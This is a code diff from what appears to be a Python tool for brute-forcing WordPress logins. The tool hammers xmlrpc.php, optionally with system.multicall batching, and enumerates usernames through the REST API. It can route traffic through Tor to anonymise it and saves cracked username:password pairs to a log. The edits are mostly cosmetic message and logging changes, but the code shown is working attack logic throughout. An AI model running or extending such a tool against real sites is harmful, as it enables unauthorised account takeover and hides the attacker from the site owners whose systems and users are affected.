@@ -402,7 +402,6 @@ async def save_successful_login(username, password):
         successful_logins.append({"username": username, "password": password})
         with open(SUCCESS_LOG, "w") as f:
             json.dump(successful_logins, f, indent=4)
-        logging.info(f"Credentials {username}:{password} added to {SUCCESS_LOG}")
     except Exception as e:
         logging.error(
             f"Error while writing successful login {username}:{password}: {e}"
@@ -421,7 +420,9 @@ async def brute_force_task(url, username, password, session):
     # check which might work with older versions
     good_matches = ['isAdmin', 'Dashboard']
     if any(response_text is not None and match in response_text for match in good_matches):
-        print(f"\n{Fore.GREEN}Login successful with {username}:{password}")
+        print_colored_bold(
+                f"\nLogin successful with {username}:{password} -- adding to {SUCCESS_LOG}",
+                color='green')
         await save_successful_login(username, password)
         return True
 
@@ -575,7 +576,9 @@ async def start_multicall_async(url, usernames, passwords, session, use_tor=Fals
             # save to successful logins file
             good_user_pass_combos = list(map(all_user_pass_combos.__getitem__, matching_indices))
             for user_pass_combo in good_user_pass_combos:
-                print(f"{Fore.GREEN}MATCH: {user_pass_combo[0]}:{user_pass_combo[1]}")
+                print_colored_bold(
+                        f"\nLogin successful with {user_pass_combo[0]}:{user_pass_combo[1]} -- "
+                        f"adding to {SUCCESS_LOG}", color='green')
                 await save_successful_login(user_pass_combo[0], user_pass_combo[1])
 
         else:
@@ -624,9 +627,7 @@ async def main():
     # Ask the user if they want to use Tor
     use_tor = input(f"{Fore.YELLOW}Do you want to use Tor? (y/n): ").lower() == "y"
     if use_tor:
-        print_colored_bold(
-            f"{Fore.YELLOW}Using Tor to anonymize the requests", color="yellow"
-        )
+        print_colored_bold('Using Tor to anonymize the requests', color="yellow")
 
     # Set up the proxy connector if using Tor
     if use_tor:
@@ -649,17 +650,14 @@ async def main():
 
         # Check if xmlrpc.php is available
         if await check_xmlrpc_available(url + "/xmlrpc.php", session):
-            print_colored_bold(
-                f"{Fore.GREEN}xmlrpc.php is available, proceeding with brute-force!",
-                color="green",
-            )
+            print_colored_bold('xmlrpc.php is available, proceeding!', color="green")
         else:
             print(f"{Fore.RED}xmlrpc.php is not available. Exiting...")
             return
 
-        # Ask the user if they want to list users from WP JSON API
+        # Ask the user if they want to list users from WP REST API
         use_wp_api = input(
-            f"{Fore.YELLOW}Do you want to list users from WP JSON API? (y/n): "
+            f"{Fore.YELLOW}Do you want to list users from WordPress REST API? (y/n): "
         ).lower()
 
         users = []
@@ -708,9 +706,9 @@ async def main():
         # detected and used the REST API. Unrelated to the REST API itself, multicall
         # won't work on versions of WordPress which have REST Infrastructure (>=4.4)
         rest_api_multicall_warning = (
-            f"{Fore.RED}REST API detected: Skipping multicall prompt because system.multicall was\n"
-            "modified in versions >=4.4 to invalidate all calls after an invalid one was detected."
-            "\nContinue to try brute force method."
+            f"{Fore.RED}REST API detected: Skipping multicall prompt because system.multicall was "
+            "modified in versions >=4.4\nto invalidate all calls after an invalid one was "
+            "detected. Continue to try brute force method."
         )
         if rest_api_used:
             print(rest_api_multicall_warning)
